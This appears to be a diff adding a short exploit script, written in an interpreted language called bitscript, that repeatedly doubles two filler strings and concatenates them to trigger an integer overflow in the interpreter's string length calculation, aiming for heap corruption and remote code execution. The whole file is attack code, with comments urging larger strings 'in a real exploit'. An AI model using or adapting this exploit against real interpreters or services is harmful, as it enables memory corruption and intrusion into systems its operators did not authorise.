@@ -1,0 +1,81 @@
+# Simplified RCE Payload - Heap Corruption Attempt
+# This version uses a loop to build strings more efficiently
+
+# Start with base strings
+string s1 = "AAAAAAAAAAAAAAAA";
+string s2 = "BBBBBBBBBBBBBBBB";
+
+# Build up strings using loops
+# Note: bitscript doesn't have for loops, so we unroll
+# In a real exploit, you'd want to build these as large as possible
+
+# Build s1
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+
+# Build s2
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+
+# Trigger the overflow
+# If s1 and s2 are large enough, len1 + len2 will overflow
+string exploit = s1 + s2;
+
+print("Heap corruption attempted");
+
